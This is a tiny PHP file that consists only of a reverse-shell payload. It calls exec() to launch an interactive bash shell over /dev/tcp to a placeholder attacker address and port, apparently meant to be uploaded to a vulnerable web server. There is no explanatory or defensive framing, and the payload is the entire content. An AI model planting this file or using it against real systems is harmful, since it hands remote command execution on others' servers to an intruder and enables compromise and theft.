<?php
	exec("/bin/bash -c 'bash -i >& /dev/tcp/<attackerIP>/<port> 0>&1'");
?>